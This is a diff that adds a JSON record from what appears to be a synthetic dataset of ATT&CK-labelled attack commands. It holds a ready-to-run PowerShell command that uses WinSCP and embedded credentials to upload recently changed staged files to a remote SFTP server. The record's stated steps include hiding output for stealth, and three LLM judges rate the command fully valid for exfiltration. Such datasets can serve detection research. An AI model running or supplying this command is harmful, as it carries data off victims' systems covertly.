@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/staging/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch abort' 'option confirm off' 'open sftp://exfil:S3cr3t!@203.0.113.30/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"put -resume C:\\Windows\\Temp\\stage\\* `\"$r`\" -filemask=>=1H\") 'exit' | Out-Null 2>$null",
+  "explanation": "Transfers only files modified within the last hour from a staging directory using WinSCP filemask time filter for automated incremental exfiltration.",
+  "rationale_steps": [
+    "Target recently changed files to minimize volume",
+    "Open non-interactive SFTP session with host key pinning",
+    "Upload with time-based filemask and resume",
+    "Suppress output for stealth"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-4fe0d1b7",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell syntax, quoting, escaping, and parentheses are balanced and valid, with appropriate WinSCP flags (/ini, /command) and redirections.",
+        "semantic_score": 5,
+        "semantic_justification": "Runs WinSCP in non-interactive batch mode to SFTP transfer only files modified within the last hour from a staging directory using -filemask and -resume, aligning with automated exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:14:08.698635Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, variable assignment, command chaining, and parameter passing to WinSCP.com with appropriate escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1020 Automated Exfiltration technique by using WinSCP to transfer files modified within the last hour from a staging directory to a remote SFTP server with credentials, hostkey verification, and automation parameters.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:14:11.518884Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid Powershell syntax for variable assignment, external command execution, and correct WinSCP command-line arguments and nested quoting for the put command.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using WinSCP to perform automated, incremental SFTP exfiltration of recently modified files from a staging directory, aligning directly with MITRE ATT&CK T1020.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:14:24.529925Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
